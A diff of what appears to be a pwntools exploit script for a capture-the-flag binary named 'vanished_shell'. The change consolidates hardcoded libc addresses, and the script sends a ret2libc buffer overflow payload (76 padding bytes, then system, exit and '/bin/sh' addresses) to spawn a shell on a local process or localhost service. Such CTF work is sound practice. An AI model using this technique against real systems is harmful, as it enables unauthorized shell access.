@@ -14,21 +14,17 @@ if args.mode in ["d", "debug"]:
     atk = process('./vanished_shell')
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
     chall = ELF('./vanished_shell', checksec=True)
-    payload_system = p32(0xf7dd38e0)
-    payload_exit = p32(0xf7dc25b0)
-    payload_sh = p32(0xf7f40de8)
 else:
     atk = remote('localhost', 1335)
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
     chall = None
-    payload_system = p32(0xf7dd88e0)
-    payload_exit = p32(0xf7dc75b0)
-    payload_sh = p32(0xf7f45de8)
 
 # Payloads
 offset = b"A" * 76
 # payload_win = p32(0x8049196)
-
+payload_system = p32(0xf7dd38e0)
+payload_exit = p32(0xf7dc25b0)
+payload_sh = p32(0xf7f40de8)
 atk.recvuntil(b"What do you want to solve?")
 # atk.sendline(offset + payload_win)
 atk.sendline(offset + payload_system + payload_exit + payload_sh)
